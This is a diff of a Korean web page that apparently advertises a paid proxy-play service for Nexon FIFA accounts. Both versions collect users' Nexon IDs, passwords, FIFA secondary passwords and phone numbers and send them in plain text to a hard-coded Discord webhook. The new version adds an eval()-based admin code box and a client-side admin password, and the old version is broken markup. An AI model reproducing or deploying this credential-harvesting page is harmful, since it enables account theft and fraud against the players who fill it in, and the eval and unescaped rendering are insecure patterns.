@@ -11,7 +11,6 @@
             background-color: #f4f5f7;
             color: #333;
         }
-        /* 상단 네비게이션 바 (쿠팡 스타일) */
         header {
             background-color: #ffffff;
             border-bottom: 1px solid #ddd;
@@ -21,28 +20,10 @@
             align-items: center;
             box-shadow: 0 2px 4px rgba(0,0,0,0.05);
         }
-        .logo {
-            font-size: 24px;
-            font-weight: 900;
-            color: #1a73e8;
-            cursor: pointer;
-        }
-        .nav-links {
-            display: flex;
-            gap: 20px;
-            font-size: 14px;
-            font-weight: 600;
-        }
-        .nav-links a {
-            text-decoration: none;
-            color: #555;
-            cursor: pointer;
-        }
-        .nav-links a:hover {
-            color: #1a73e8;
-        }
-
-        /* 메인 컨테이너 */
+        .logo { font-size: 24px; font-weight: 900; color: #1a73e8; cursor: pointer; }
+        .nav-links { display: flex; gap: 20px; font-size: 14px; font-weight: 600; }
+        .nav-links a { text-decoration: none; color: #555; cursor: pointer; }
+        .nav-links a:hover { color: #1a73e8; }
         .main-wrapper {
             display: flex;
             justify-content: center;
@@ -50,187 +31,104 @@
             min-height: calc(100vh - 70px);
             padding: 20px;
         }
-        .container {
-            background-color: #ffffff;
-            padding: 40px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            width: 100%;
-            max-width: 520px;
-        }
-        h1 {
-            text-align: center;
-            color: #1a73e8;
-            margin-bottom: 5px;
-            font-size: 30px;
-            font-weight: 800;
-        }
-        .subtitle {
-            text-align: center;
-            font-size: 14px;
-            color: #d93025;
-            margin-bottom: 20px;
-            font-weight: 700;
-        }
-        .info-box {
-            background-color: #f8f9fa;
-            border: 1px solid #e9ecef;
-            padding: 15px 18px;
-            border-radius: 10px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #495057;
-            line-height: 1.5;
-        }
-        .info-box p { margin: 4px 0; font-weight: 500; }
-        .form-group { margin-bottom: 15px; }
-        label {
-            display: block;
-            margin-bottom: 6px;
-            font-weight: 700;
-            color: #202124;
-            font-size: 14px;
-        }
-        input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1.5px solid #dadce0;
-            border-radius: 8px;
-            font-size: 15px;
-            background-color: #fff;
-        }
-        input:focus {
-            outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 3px rgba(26, 115, 232, 0.15);
-        }
-        .notice-text {
-            background-color: #e8f0fe;
-            color: #1967d2;
-            padding: 10px 12px;
-            border-radius: 8px;
-            font-size: 13px;
-            font-weight: 600;
-            text-align: center;
-            margin-bottom: 20px;
-            border: 1px solid #d2e3fc;
-        }
-        button.submit-btn {
-            width: 100%;
-            background-color: #1a73e8;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-        }
-        button.submit-btn:hover { background-color: #1557b0; }
-
-        /* 페이지 전환용 스타일 */
-        .page { display: none; }
+        .page { display: none; width: 100%; max-width: 500px; }
         .page.active { display: block; }
-
-        /* 관리자 테이블 스타일 */
-        table {
-            width: 100%;
-            border-collapse: collapse;
-            margin-top: 15px;
-            font-size: 13px;
+        .card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.08);
         }
-        th, td {
-            border: 1px solid #ddd;
-            padding: 10px;
-            text-align: center;
+        h2 { margin-bottom: 20px; color: #222; text-align: center; }
+        .input-group { margin-bottom: 15px; }
+        .input-group label { display: block; margin-bottom: 6px; font-weight: 600; font-size: 13px; color: #555; }
+        .input-group input {
+            width: 100%; padding: 12px; border: 1px solid #ddd;
+            border-radius: 6px; font-size: 14px; outline: none;
         }
-        th { background-color: #f1f3f5; }
+        .input-group input:focus { border-color: #1a73e8; }
+        .btn {
+            width: 100%; padding: 14px; background-color: #1a73e8; color: #ffffff;
+            border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer;
+        }
+        .btn:hover { background-color: #1557b0; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 13px; }
+        th, td { border: 1px solid #ddd; padding: 10px; text-align: center; }
+        th { background-color: #f8f9fa; }
+        .admin-controls { margin-top: 15px; display: flex; gap: 10px; }
+        .admin-controls input { flex: 1; padding: 10px; border: 1px solid #ddd; border-radius: 6px; }
+        .admin-controls button { padding: 10px 15px; background-color: #333; color: #fff; border: none; border-radius: 6px; cursor: pointer; }
     </style>
 </head>
 <body>
 
-    <!-- 상단 네비게이션 바 -->
     <header>
         <div class="logo" onclick="switchPage('home')">빽대낙</div>
         <div class="nav-links">
-            <a onclick="alert('고객센터: 오픈채팅방 또는 공지사항을 확인해주세요!')">고객센터</a>
-            <a onclick="alert('로그인 기능은 준비 중입니다.')">로그인</a>
-            <a onclick="alert('회원가입 기능은 준비 중입니다.')">회원가입</a>
-            <a onclick="openAdmin()" style="color: #d93025; font-weight: bold;">관리자 모드</a>
+            <a onclick="switchPage('home')">신청하기</a>
+            <a onclick="openAdmin()">관리자 모드</a>
         </div>
     </header>
 
     <div class="main-wrapper">
-        <!-- 1. 홈 / 신청 페이지 -->
-        <div id="home-page" class="container page active">
-            <h1>빽대낙</h1>
-            <div class="subtitle">⚽ 넥슨 ID 전용 프리미엄 대낙 서비스</div>
-            
-            <div class="info-box">
-                <p>⏰ <strong>운영 시간:</strong> 아침 10:00 ~ 저녁 22:00</p>
-                <p>💰 <strong>이용 가격:</strong> 1,000원</p>
+        <!-- 홈 (신청 페이지) -->
+        <div id="home-page" class="page active">
+            <div class="card">
+                <h2>빽대낙 프리미엄 신청</h2>
+                <form onsubmit="handleApply(event)">
+                    <div class="input-group">
+                        <label>넥슨 아이디</label>
+                        <input type="text" id="nexonId" required placeholder="아이디를 입력하세요">
+                    </div>
+                    <div class="input-group">
+                        <label>넥슨 비밀번호</label>
+                        <input type="password" id="nexonPw" required placeholder="비밀번호를 입력하세요">
+                    </div>
+                    <div class="input-group">
+                        <label>피파 2차 비밀번호</label>
+                        <input type="password" id="fifaPw" required placeholder="2차 비밀번호를 입력하세요">
+                    </div>
+                    <div class="input-group">
+                        <label>전화번호 (계좌 전송용)</label>
+                        <input type="text" id="phone" required placeholder="010-0000-0000">
+                    </div>
+                    <button type="submit" class="btn">신청하기</button>
+                </form>
             </div>
-
-            <form onsubmit="handleApply(event)">
-                <div class="form-group">
-                    <label for="nexonId">넥슨 ID</label>
-                    <input type="text" id="nexonId" required placeholder="넥슨 아이디를 입력하세요">
-                </div>
-
-                <div class="form-group">
-                    <label for="nexonPw">넥슨 비밀번호</label>
-                    <input type="password" id="nexonPw" required placeholder="넥슨 비밀번호를 입력하세요">
-                </div>
-
-                <div class="form-group">
-                    <label for="fifaPw">피파 비밀번호</label>
-                    <input type="password" id="fifaPw" maxlength="4" required placeholder="피파 게임 내 비밀번호 4자리">
-                </div>
-
-                <div class="form-group">
-                    <label for="phone">전화번호 (11자리)</label>
-                    <input type="tel" id="phone" maxlength="11" required placeholder="'-' 제외하고 11자리 입력">
-                </div>
-
-                <div class="notice-text">
-                    📌 적어주신 전화번호로 계좌번호를 보내드립니다.
-                </div>
-
-                <button type="submit" class="submit-btn">대낙 신청하기</button>
-            </form>
         </div>
 
-        <!-- 2. 관리자 페이지 -->
-        <div id="admin-page" class="container page" style="max-width: 800px;">
-            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h2 style="color: #d93025;">🛠️ 빽대낙 관리자 페이지</h2>
-                <button onclick="switchPage('home')" style="padding: 8px 12px; background: #555; color: white; border: none; border-radius: 5px; cursor: pointer;">돌아가기</button>
-            </div>
-            <p style="margin-bottom: 15px; font-size: 14px; color: #666;">실시간 접수된 대낙 신청 내역입니다.</p>
-            
-            <div style="overflow-x: auto;">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>신청시간</th>
-                            <th>넥슨 ID</th>
-                            <th>넥슨 PW</th>
-                            <th>피파 PW</th>
-                            <th>전화번호</th>
-                        </tr>
-                    </thead>
-                    <tbody id="applyTableBody">
-                        <tr>
-                            <td colspan="5" style="color: #888;">신청된 내역이 없습니다.</td>
-                        </tr>
-                    </tbody>
-                </table>
+        <!-- 관리자 페이지 -->
+        <div id="admin-page" class="page" style="max-width: 800px;">
+            <div class="card">
+                <h2>관리자 실시간 신청 내역</h2>
+                <div style="overflow-x: auto;">
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>신청 시간</th>
+                                <th>넥슨 아이디</th>
+                                <th>넥슨 비밀번호</th>
+                                <th>피파 비번</th>
+                                <th>전화번호</th>
+                            </tr>
+                        </thead>
+                        <tbody id="applyTableBody">
+                            <!-- 실시간 목록이 여기에 뜸 -->
+                        </tbody>
+                    </table>
+                </div>
+
+                <!-- 관리자용 코드 입력 창 -->
+                <div class="admin-controls">
+                    <input type="text" id="adminCodeInput" placeholder="자바스크립트 코드 입력 (예: clearData())">
+                    <button onclick="executeAdminCode()">코드 실행</button>
+                </div>
+                <button onclick="switchPage('home')" class="btn" style="background-color: #666; margin-top: 15px;">홈으로 돌아가기</button>
             </div>
         </div>
     </div>
 
     <script>
-        // 신청 데이터 저장용 배열 (브라우저 메모리 기반)
         let applyList = JSON.parse(localStorage.getItem('applyList')) || [];
 
         function switchPage(pageName) {
@@ -243,45 +141,33 @@
             }
         }
 
-        // 대낙 신청 처리
-       // 대낙 신청 처리 및 디스코드 실시간 알림 전송
-function handleApply(event) {
-   event.preventDefault();
-    const nexonId = document.getElementById('nexonId').value;
-    const nexonPw = document.getElementById('nexonPw').value;
-    const fifaPw = document.getElementById('fifaPw').value;
-    const phone = document.getElementById('phone').value;
-    const time = new Date().toLocaleString();
+        function handleApply(event) {
+            event.preventDefault();
+            const nexonId = document.getElementById('nexonId').value;
+            const nexonPw = document.getElementById('nexonPw').value;
+            const fifaPw = document.getElementById('fifaPw').value;
+            const phone = document.getElementById('phone').value;
+            const time = new Date().toLocaleString();
 
-    // 디스코드에 보낼 메시지 내용
-    const discordPayload = {
-        content: `🚨 **[새로운 대낙 신청 완료!]** 🚨\n> **신청 시간:** ${time}\n> **넥슨 아이디:** \`${nexonId}\`\n> **넥슨 비밀번호:** \`${nexonPw}\`\n> **피파 비밀번호:** \`${fifaPw}\`\n> **전화번호:** \`${phone}\``
-    };
+            const discordPayload = {
+                content: `🚨 **[새로운 대낙 신청 완료!]** 🚨\n> **신청 시간:** ${time}\n> **넥슨 아이디:** \`${nexonId}\`\n> **넥슨 비밀번호:** \`${nexonPw}\`\n> **피파 비밀번호:** \`${fifaPw}\`\n> **전화번호:** \`${phone}\``
+            };
 
-    // 내 디스코드 웹훅으로 데이터 전송
-    fetch('https://discord.com/api/webhooks/1533786795622273205/39PCiRPZtyRzLqrzCUrqp5YFpBt7WQCoNnnKfYf5cOLLipPt5v2CArkjrw9EAvuw53Hd', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(discordPayload)
-    })
-    .then(response => {
-        if (!response.ok) {
-            console.error("디스코드 전송 실패");
+            fetch('https://discord.com/api/webhooks/1533786795622273205/39PCiRPZtyRzLqrzCUrqp5YFpBt7WQCoNnnKfYf5cOLLipPt5v2CArkjrw9EAvuw53Hd', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(discordPayload)
+            }).catch(error => console.error("디스코드 전송 에러:", error));
+
+            const newItem = { time, nexonId, nexonPw, fifaPw, phone };
+            applyList.unshift(newItem);
+            localStorage.setItem('applyList', JSON.stringify(applyList));
+
+            alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n입력하신 번호로 계좌번호가 발송됩니다!`);
+            event.target.reset();
+            renderAdminTable();
         }
-    })
-    .catch(error => {
-        console.error("네트워크 오류: " + error);
-    });
 
-    // 리스트에 추가
-    applyList.push({ time, nexonId, nexonPw, fifaPw, phone });
-    localStorage.setItem('applyList', JSON.stringify(applyList));
-    
-    alert(`[빽대낙 신청 완료]\n\n넥슨 아이디: ${nexonId}\n전화번호: ${phone}\n입력하신 번호로 계좌번호가 발송됩니다!`);
-    event.target.reset();
-        // 관리자 모드 진입 (비밀번호 0814)
         function openAdmin() {
             const password = prompt("관리자 비밀번호를 입력하세요:");
             if (password === "0814") {
@@ -291,11 +177,16 @@ function handleApply(event) {
             }
         }
 
-        // 관리자 테이블 그리기
         function renderAdminTable() {
+            applyList = JSON.parse(localStorage.getItem('applyList')) || [];
             const tbody = document.getElementById('applyTableBody');
+            
             if (applyList.length === 0) {
-                tbody.innerHTML = `<tr><td co
+                tbody.innerHTML = `<tr><td colspan="5" style="text-align: center;">신청 내역이 없습니다.</td></tr>`;
+                return;
+            }
+
+            let html = '';
             applyList.forEach(item => {
                 html += `
                     <tr>
@@ -309,12 +200,24 @@ function handleApply(event) {
             });
             tbody.innerHTML = html;
         }
-    </script>
-   <a href="sms:01092054260" style="display: block; width: 100%; padding: 14px 0; background-color: #2b70de; color: #ffffff; text-align: center; text-decoration: none; font-size: 16px; font-weight: bold; border-radius: 6px; box-sizing: border-box;">문자로 신청하기</a>
-</div>
-</body>
-</html>
-</div>
-</body>
-</html>
 
+        function executeAdminCode() {
+            const code = document.getElementById('adminCodeInput').value;
+            try {
+                const result = eval(code);
+                alert("코드 실행 성공!\n결과: " + (result !== undefined ? result : "실행 완료"));
+                renderAdminTable();
+            } catch (err) {
+                alert("코드 실행 에러: " + err);
+            }
+        }
+
+        function clearData() {
+            localStorage.removeItem('applyList');
+            applyList = [];
+            renderAdminTable();
+            return "모든 신청 내역이 초기화되었습니다.";
+        }
+    </script>
+</body>
+</html>
